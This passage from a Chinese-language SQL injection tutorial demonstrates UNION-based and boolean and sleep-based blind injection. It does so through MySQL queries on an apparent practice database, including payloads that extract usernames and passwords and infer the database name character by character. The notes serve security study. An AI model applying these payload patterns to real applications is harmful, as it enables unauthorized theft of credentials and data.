# **<font style="color:rgb(38, 38, 38);">2.3.1.3 </font>**union联合注入
    5. 查询所有的内容来自`users`表，条件是id=1，联合查询`1,2,3`  
`select * from users where id = 1 union select 1,2,3;`  
![](../../../../images/2eb96cefbbdf195bf25fbad6fa00bb57.png)
    6. 当union之前的查询语句，查询结果为空，会将`1,2,3`放到第一行  
`select * from users where id = 0 union select 1,2,3;`  
![](../../../../images/ceb4213bfee4e91add5b00620205fbe8.png)
    7. 使用别名进行查询  
`select u.id from users as u where id = 0  union select 1,2,3;`  
![](../../../../images/f0c4833b91601277266692587c29943c.png)  
`users as  u`代表给`users`取一个别名叫做`u`  
`u.id`代表`u`中的`id`字段
    8. 查询条件是`id<5`的数据  
`select u.id,u.username,u.password from users as u where id < 5  union select 1,2,3;`![](../../../../images/616717634e8583e9359e3a10e662883a.png)
    9. 使用`limit 0,3`进行截取,从第0行截取，取3行  
` select u.id,u.username,u.password from users as u where id < 5  union select 1,2,3 limit 0,3;`![](../../../../images/843f7a0484cfcf13c6b7983fe84286b5.png)
    10. 将多行数据整合为一行输出  
`select group_concat(u.id,'~',u.username,'~',u.password) from users as u where id < 5  union select 1`![](../../../../images/4622b8ee86d69d0bd28b4ba1557853df.png)

# **<font style="color:rgb(38, 38, 38);">2.3.1.4 </font>**布尔注入和睡眠注入
    1. 查询security.users中条件id=1的数据  
`select * from security.users where id =1;`  
![](../../../../images/c96bceb5383bc823bc15c780b38dbe4c.png)
    2. 添加`and`进行判断  
`select * from security.users where id =1 and 1=1;`   正常查询  
`select * from security.users where id =1 and 1=2;`    异常但不是语法报错  
![](../../../../images/16d564d801ec5025e32d2aa481b7394a.png)
    3. 使用布尔进行判断  
`select * from security.users where id =1 and ascii(substr(database(),1,1))=115;`  
![](../../../../images/b89a2fabaa5e3f3ce598a34bcfe1c683.png)  
`ascii()`将字符转化为数字  
`substr(被截取的字符串,开始的位置,取一个字符)`
    4. 使用睡眠进行布尔判断  
`select * from security.users where id =1 and If(ascii(substr(database(),1,1))=115,1,sleep(5));`  
`select * from security.users where id =1 and If(ascii(substr(database(),1,1))=116,1,sleep(5));`![](../../../../images/2b4363f3d01ef00103fc14362a4b1448.png)
